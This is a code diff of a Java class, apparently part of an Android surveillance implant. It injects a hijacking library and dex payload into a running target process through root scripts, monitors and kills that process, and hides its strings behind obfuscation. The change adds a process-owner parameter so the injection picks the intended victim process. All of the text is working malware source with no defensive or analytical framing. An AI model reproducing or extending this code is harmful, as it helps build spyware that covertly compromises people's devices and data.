@@ -16,6 +16,7 @@ import java.util.concurrent.TimeUnit;
 public class Instrument {
 	private static final String TAG = "Instrument";
 	private static final int MAX_KILLED = 3;
+	private String proc_owner = null;
 	private String dex_dest = null;
 	private String proc;
 	private PidMonitor pidMonitor;
@@ -29,11 +30,11 @@ public class Instrument {
 	private String lid = M.e(" lid ");
 
 
-	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library) {
+	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library,String owner) {
 		final File filesPath = Status.getAppContext().getFilesDir();
 
 		proc = process;
-
+		proc_owner = owner;
 		hijacker = "m";
 		libInAsset = library;
 		lib_dest = String.valueOf(Math.abs((int)Utils.getRandom()));
@@ -43,12 +44,16 @@ public class Instrument {
 		pidCompletePath = path + "/" + pidFile;
 		sync_semaphore = sem;
 	}
-	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library,String _dexFile) {
-		this(process,dump,_pidFile,sem,library);
+	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library,String _dexFile,String owner) {
+		this(process,dump,_pidFile,sem,library,owner);
 		dexFile = _dexFile;
 		dex_dest = "d"+dexFile.hashCode()+".dex";
 
 
+	}
+
+	public Instrument(String process, String dump, String _pidFile, Semaphore sem, String library) {
+		this(process,dump,_pidFile,sem,library,null);
 	}
 
 	public String getInstrumentationSuccessDir() {
@@ -155,7 +160,7 @@ public class Instrument {
 		try {
 			if(sync_semaphore == null || sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS)) {
 				try {
-					int pid = getProcessPid(proc);
+					int pid = getProcessPid(proc, proc_owner);
 
 					if (pid > 0) {
 						// Run the injector
@@ -176,7 +181,7 @@ public class Instrument {
 						Root.removeScript(scriptName);
 
 						Utils.sleep(2000);
-						int newpid = getProcessPid(proc);
+						int newpid = getProcessPid(proc,proc_owner);
 						if (newpid != pid) {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (_startInstrumentation) Error: "+proc+" was killed");
@@ -281,7 +286,7 @@ public class Instrument {
 		stopMonitor = true;
 		monitor = null;
 		int trials=5;
-		int pid_start = getProcessPid(proc);
+		int pid_start = getProcessPid(proc,proc_owner);
 		int pid_stop = pid_start;
 
 		while(trials-->0 && pid_start==pid_stop) {
@@ -290,17 +295,15 @@ public class Instrument {
 			}
 
 			try {
-				if(sync_semaphore != null){
+				if(sync_semaphore != null) {
 					sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS);
-				}
-
-				try {
-					killProc(proc);
-					Utils.sleep(2000);
-				}finally {
-					if(sync_semaphore != null) {
-						sync_semaphore.release();
+					try {
+						killProc(proc);
+					} finally {
+							sync_semaphore.release();
 					}
+				}else{
+					killProc(proc);
 				}
 
 			} catch (InterruptedException e) {
@@ -309,11 +312,14 @@ public class Instrument {
 					Check.log(TAG + " (stopInstrumentation "+proc+") Interrupted when trying to restore "+ proc);
 				}
 			}
-			pid_stop = getProcessPid(proc);
+			pid_stop = getProcessPid(proc,proc_owner);
+		}
+		if(pid_start != pid_stop){
+			started = false;
 		}
 	}
 
-	private int getProcessPid(String process) {
+	private int getProcessPid(String process,String proc_owner) {
 		int pid = -1;
 		/*
 		byte[] buf = new byte[4];
@@ -344,7 +350,7 @@ public class Instrument {
 			return 0;
 		}
 		*/
-		String pid_s = Utils.pidOf(process);
+		String pid_s = Utils.pidOf(process,proc_owner);
 		if(pid_s != null){
 			try{
 				pid = Integer.valueOf(pid_s);
@@ -357,7 +363,7 @@ public class Instrument {
 
 	public void killProc(String process) {
 		try {
-			int pid = getProcessPid(process);
+			int pid = getProcessPid(process,proc_owner);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (killProc) try to kill " + pid);
 			}
@@ -398,7 +404,7 @@ public class Instrument {
 					return;
 				}
 
-				cur_pid = getProcessPid(proc);
+				cur_pid = getProcessPid(proc,proc_owner);
 
 				// process died
 				if (cur_pid != start_pid) {
